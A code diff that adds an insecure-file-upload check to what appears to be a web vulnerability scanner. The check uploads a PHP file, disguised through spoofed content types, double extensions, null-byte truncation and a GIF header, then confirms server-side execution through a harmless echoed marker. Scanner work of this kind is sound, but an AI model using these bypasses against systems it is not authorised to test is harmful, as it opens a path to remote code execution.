@@ -607,6 +607,67 @@ def path_traversal(ctx, probe) -> bool | None:
     return False if tested else None
 
 
+# Insecure file upload — comprehensive filter-bypass coverage: a PHP webshell accepted despite
+# extension / content-type / double-extension / null-byte / magic-byte controls, then EXECUTED. The
+# payload echoes an arithmetic expression (hlup + 7*7 -> "hlup49x"); "hlup49x" in the FETCHED file
+# proves server-side execution (the stored SOURCE shows "(7*7)", never "49") -> RCE, not mere storage.
+_UPLOAD_MARK = "hlup49x"
+_UPLOAD_PHP = b"<?php echo 'hlup'.(7*7).'x'; ?>"
+_GIF_MAGIC = b"GIF89a"                     # a real image magic header to defeat content-sniffing
+_UPLOAD_DIRS = ("", "uploads/", "upload/", "files/", "file/", "images/", "img/", "media/",
+                "hackable/uploads/", "assets/uploads/", "static/uploads/", "tmp/", "data/uploads/")
+
+
+def _upload_variants():
+    """(filename, content_type, body) across the standard upload-filter bypasses."""
+    return [
+        ("hlshell.php", "application/x-php", _UPLOAD_PHP),                # unrestricted
+        ("hlshell.php", "image/jpeg", _UPLOAD_PHP),                      # content-type spoof
+        ("hlshell.jpg.php", "image/jpeg", _UPLOAD_PHP),                  # double extension
+        ("hlshell.php.jpg", "image/jpeg", _UPLOAD_PHP),                  # trailing extension
+        ("hlshell.phtml", "image/jpeg", _UPLOAD_PHP),                    # alternate PHP extension
+        ("hlshell.php\x00.jpg", "image/jpeg", _UPLOAD_PHP),             # null-byte truncation
+        ("hlshell.php", "image/gif", _GIF_MAGIC + b"\n" + _UPLOAD_PHP),  # magic-byte spoof + PHP
+    ]
+
+
+def _locate_upload(resp_text: str, filename: str) -> list[str]:
+    """Candidate URLs for the just-uploaded file: any path in the response naming it, then common
+    upload directories."""
+    base = filename.split("\x00")[0].split("/")[-1]
+    urls = ["/" + m.lstrip("./").lstrip("/")
+            for m in re.findall(r"[\w./-]*" + re.escape(base), resp_text)]
+    urls += ["/" + d + base for d in _UPLOAD_DIRS]
+    return list(dict.fromkeys(urls))
+
+
+def file_upload(ctx, probe) -> bool | None:
+    """Insecure file upload across multipart forms with a file field: upload a PHP webshell in several
+    filter-bypass shapes, locate it (from the response or common upload dirs), fetch it, and fire when
+    it EXECUTES (arithmetic marker). N/A when there's no file-upload form."""
+    forms = [f for f in ctx.profile.forms if f.file_fields]
+    if not forms:
+        return None
+    tested = False
+    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
+        for f in forms:
+            for filename, ctype, body in _upload_variants():
+                tested = True
+                files = {ff: (filename, body, ctype) for ff in f.file_fields}
+                data = {fn: _XSS_FILLER for fn in f.fields if fn not in f.file_fields}
+                try:
+                    resp = c.request((f.method or "post").upper(), f.action, files=files, data=data)
+                except (httpx.HTTPError, httpx.InvalidURL):
+                    continue
+                for url in _locate_upload(resp.text, filename):
+                    try:
+                        if _UPLOAD_MARK in c.get(url).text:
+                            return True  # the uploaded PHP executed server-side -> RCE via upload
+                    except (httpx.HTTPError, httpx.InvalidURL):
+                        continue
+    return False if tested else None
+
+
 # API BOLA / horizontal IDOR (OWASP API-Security #1): an object created by user A is readable by
 # user B. Verified with a planted canary — B's read must return A's SECRET value (not just a 2xx, and
 # not the id A chose, which legitimately echoes back), so a token-scoped or no-op endpoint can't false
@@ -1013,6 +1074,7 @@ PREDICATES = {
     "xss_injectable": xss_injectable,
     "command_injection": command_injection,
     "path_traversal": path_traversal,
+    "file_upload": file_upload,
     "api_bola": api_bola,
     "session_cookie_missing_flag": session_cookie_missing_flag,
     "login_no_rate_limit": login_no_rate_limit,
@@ -1053,6 +1115,7 @@ _PREDICATE_REASONS = {
     "xss_injectable": "an input reflects unescaped into HTML (XSS: script / img / svg / attribute / stored)",
     "command_injection": "an input reaches an OS shell (injected command executed: separator / substitution / time-based)",
     "path_traversal": "a filename param served a file outside the web root (path traversal / local file inclusion)",
+    "file_upload": "an uploaded webshell was accepted and executed server-side (insecure file upload -> RCE)",
     "api_bola": "one account's object (and its secret) was readable by another account (broken object-level auth)",
     "session_cookie_missing_flag": "session cookie missing the {flag} flag",
     "csrf_missing": "state-changing POST accepted cross-site with no token / SameSite",
